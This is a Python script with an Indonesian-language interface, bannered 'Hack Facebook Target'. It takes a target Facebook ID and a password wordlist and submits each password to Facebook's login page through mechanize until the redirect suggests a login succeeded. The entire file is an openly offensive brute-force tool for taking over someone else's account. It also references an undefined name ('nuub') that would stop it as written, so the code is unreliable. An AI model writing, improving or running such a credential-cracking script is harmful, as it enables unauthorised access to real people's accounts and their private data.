#!/usr/bin/env python
# -*- coding: UTF-8 -*-
	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 1000)

GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan
     
def cover():
    print """
    
    
    
    
     """
    runntek(GL+"           Assalamu'alaikum")
    runntek(RR+"            Jawab Bossq :)")
    time.sleep(0)
    print " "
    print W+" []===============================[]"
    print R+" []     Hack Facebook Target      []"
    print W+" []===============================[]"
    print G+" [] Author  : Billal              []"      
    print G+" [] Version : 1.0                 []" 
    print G+" [] Code    : dr460n              []"
    print W+" []===============================[]"
    print Y+" []   !! Gunakan Dengan Bijak !!  []"
    print W+" []===============================[]"
    print """
    
    """

cover()
print """
      """
print GG+" Masukan ID Target"
email = str(raw_input(GL+" dr460n >>\033[33;1m: "))

print """
      """
print GG+" Masukan file password\033[34m [ pass.txt ]"
passwordlist = str(raw_input(GL+" dr460n >> \033[92;1m: "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]



def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        njing()
        bismilah()
        print " "
        runntek(RR+"  Wordlis Tidak Ada yang Cocok")
        runntek(RR+"  Kembangin Wordlistnya Sendiri Cuk")
        time.sleep(1)
        print WW+34*"  -"
        kol()

def kol():
    nok = raw_input("Edit wordlist cuk.? \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Silahkan tulis perintah \033[92;1m[ nano pass.txt ] !")
        print WW+(41*"-")
        print GL+(" ")
        os.sys.exit()
    else:
        exit(0)

def bismilah():
        global password
        noobs = open(passwordlist,"r")
        for password in noobs:
                noobs = password.replace("\n","")
                iqbalz(password)


	
def iqbalz(password):
        sys.stdout.write(GG+"\r[+]\033[97;1m Mencoba ..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Password Find \033[31;1m===| \033[96;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"TEKAN ENTER UNTUK KELUAR.....")
                        sys.exit(1)



#welcome
def njing():
        nuub
        print nuub
        print " "
        pass_tot = open(passwordlist,"r")
        pass_tot = pass_tot.readlines()
        print " "
        print GL+" [#] Sedang MengCrack : {}".format(email)
        print RR+" [#] Jumlah :" , len(pass_tot),WW+ "password saat ini"
        print Y+" [#] Tunggu Proses Cracking Password .....\n\n"

if __name__ == '__main__':
        main()
